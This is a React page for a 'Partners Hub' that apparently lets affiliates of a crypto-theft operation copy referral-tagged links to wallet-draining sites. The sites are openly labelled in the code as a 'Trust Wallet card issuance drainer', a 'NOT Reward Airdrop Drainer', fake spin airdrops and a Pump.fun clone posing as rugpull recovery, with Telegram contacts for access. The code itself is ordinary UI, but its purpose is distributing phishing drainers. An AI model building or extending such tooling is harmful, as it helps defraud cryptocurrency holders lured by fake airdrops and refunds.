'use client';

import { useState, useEffect } from 'react';
import { 
  Cpu, 
  ExternalLink, 
  Copy, 
  CheckCircle2, 
  MessageSquare, 
  Zap, 
  Globe, 
  Wallet, 
  Coins, 
  ShieldCheck 
} from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

export default function BotsHubPage() {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);
  const [copiedLink, setCopiedLink] = useState(null);

  useEffect(() => {
    const fetchUser = async () => {
      try {
        const res = await fetch('/api/auth/me');
        if (res.ok) setUser(await res.json());
      } catch (err) {
        console.error('Error fetching user info');
      } finally {
        setLoading(false);
      }
    };
    fetchUser();
  }, []);

  const handleCopy = (url, id) => {
    navigator.clipboard.writeText(url);
    setCopiedLink(id);
    setTimeout(() => setCopiedLink(null), 2000);
  };

  if (loading) {
    return (
      <div className="flex flex-col items-center justify-center min-h-[60vh] gap-4">
        <div className="relative size-12">
          <div className="absolute inset-0 border-2 border-makuoze-red/20 rounded-full" />
          <div className="absolute inset-0 border-t-2 border-makuoze-red rounded-full animate-spin" />
        </div>
        <p className="text-zinc-600 text-[10px] font-black uppercase tracking-[0.3em] animate-pulse">Initializing Ops...</p>
      </div>
    );
  }

  const referralCode = `98396423-${user?.affiliate_name || 'partner'}`;
  const dbLinks = user?.links || {};

  /**
   * getBotUrl:
   * 1. If a full URL is provided in the database, use it EXACTLY as is.
   * 2. Otherwise, use the default base URL and append the legacy referral code.
   */
  const getBotUrl = (key, defaultBase) => {
    if (dbLinks[key]) return dbLinks[key];
    
    // Legacy fallback behavior
    const separator = defaultBase.includes('?') ? '&' : '?';
    return `${defaultBase}${separator}invite=${referralCode}`;
  };

  const networks = [
    {
      name: 'Solana Network',
      icon: Zap,
      color: 'text-makuoze-red',
      items: [
        {
          id: 'solisium',
          title: 'Solisium',
          desc: 'Advanced Solana AI Sniper Bot & MEV Bot interface',
          url: getBotUrl('solisium', 'https://solisium.org/'),
        },
        {
          id: 'solana-spin',
          title: 'Solana Spin',
          desc: 'High-conversion Solana Spin Airdrop',
          url: getBotUrl('solana_spin', 'https://www.solarcade.fun/'),
        },
        {
          id: 'pump-fun',
          title: 'Pump Fun Refund',
          desc: 'Exclusive Pump.fun clone for 60% rugpull recovery',
          url: getBotUrl('pump_fun', 'https://www.core-pump.fun/'),
        }
      ]
    },
    {
      name: 'Tron Network',
      icon: ShieldCheck,
      color: 'text-zinc-400',
      items: [
        {
          id: 'trust-card',
          title: 'Trust Wallet Card',
          desc: 'Premium Trust Wallet card issuance drainer',
          contactType: 'telegram',
          url: dbLinks['tron_card'] || 'https://t.me/okx_development',
        }
      ]
    },
    {
      name: 'TON Network',
      icon: Coins,
      color: 'text-blue-400',
      items: [
        {
          id: 'ton-spin',
          title: 'TON Spin',
          desc: 'High-conversion TON Spin Airdrop interface',
          contactType: 'access',
          url: dbLinks['ton_spin'] || 'https://t.me/okx_development',
        },
        {
          id: 'notcoin-reward',
          title: 'Notcoin Reward',
          desc: 'Exclusive NOT Reward Airdrop Drainer',
          contactType: 'access',
          url: dbLinks['notcoin_reward'] || 'https://t.me/okx_development',
        }
      ]
    }
  ];

  return (
    <div className="space-y-12 pb-24">
      <motion.header 
        initial={{ opacity: 0, x: -20 }}
        animate={{ opacity: 1, x: 0 }}
        className="flex flex-col md:flex-row md:items-center justify-between gap-4"
      >
        <div>
          <h1 className="text-3xl md:text-5xl lg:text-6xl font-black uppercase italic tracking-tighter flex items-center gap-3 text-white leading-none">
            Partners <span className="text-makuoze-red">Hub</span>
          </h1>
          <p className="text-zinc-500 text-xs font-bold uppercase tracking-widest mt-1">Access and distribute multi-chain extraction tools.</p>
        </div>
      </motion.header>

      <div className="space-y-16">
        {networks.map((network, netIndex) => (
          <motion.section 
            key={network.name}
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: netIndex * 0.1 }}
            className="space-y-6"
          >
            <div className="flex items-center gap-4">
              <div className={`size-10 rounded-xl bg-white/5 border border-white/5 flex items-center justify-center ${network.color}`}>
                <network.icon size={20} />
              </div>
              <h2 className="text-xl font-black uppercase italic tracking-tighter text-white">{network.name}</h2>
              <div className="h-[1px] flex-1 bg-gradient-to-r from-white/10 to-transparent" />
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
              {network.items.map((bot, botIndex) => (
                <motion.div
                  key={bot.id}
                  whileHover={{ scale: 1.02 }}
                  className="glass-panel p-6 rounded-[2rem] flex flex-col justify-between group transition-all"
                >
                  <div>
                    <div className="flex items-center justify-between mb-4">
                      <h3 className="font-black text-lg uppercase italic tracking-tighter group-hover:text-makuoze-red transition-colors">
                        {bot.title}
                      </h3>
                      {bot.contactType ? (
                        <div className="text-[9px] font-black text-zinc-500 bg-white/5 px-2 py-1 rounded border border-white/10 uppercase tracking-widest">
                          Contact Req.
                        </div>
                      ) : (
                        <Globe size={16} className="text-zinc-700 group-hover:text-makuoze-red-light transition-colors" />
                      )}
                    </div>
                    <p className="text-zinc-500 text-xs font-bold leading-relaxed mb-6">
                      {bot.desc}
                    </p>
                  </div>

                  <div className="space-y-3">
                    {bot.contactType ? (
                      <a
                        href={bot.url}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="w-full bg-makuoze-gradient p-4 rounded-xl flex items-center justify-center gap-3 text-[10px] font-black uppercase tracking-[0.2em] hover:scale-[1.02] active:scale-[0.98] transition-all shadow-[0_4px_15px_rgba(177,0,0,0.2)]"
                      >
                        <MessageSquare size={14} /> Get Access
                      </a>
                    ) : (
                      <>
                        <div className="relative group/link">
                          <input 
                            type="text"
                            readOnly
                            value={bot.url}
                            className="w-full bg-black/60 border border-white/5 rounded-xl px-4 py-3 text-[9px] font-mono font-bold text-zinc-500 truncate pr-10 focus:outline-none"
                          />
                          <button 
                            onClick={() => handleCopy(bot.url, bot.id)}
                            className="absolute right-2 top-1/2 -translate-y-1/2 p-2 text-zinc-600 hover:text-white transition-colors"
                          >
                            {copiedLink === bot.id ? <CheckCircle2 size={14} className="text-emerald-500" /> : <Copy size={14} />}
                          </button>
                        </div>
                        <a
                          href={bot.url}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="w-full bg-zinc-900 border border-white/5 p-4 rounded-xl flex items-center justify-center gap-3 text-[10px] font-black uppercase tracking-[0.2em] hover:bg-zinc-800 transition-all text-white"
                        >
                          <ExternalLink size={14} /> View DApp
                        </a>
                      </>
                    )}
                  </div>
                </motion.div>
              ))}
            </div>
          </motion.section>
        ))}
      </div>
    </div>
  );
}
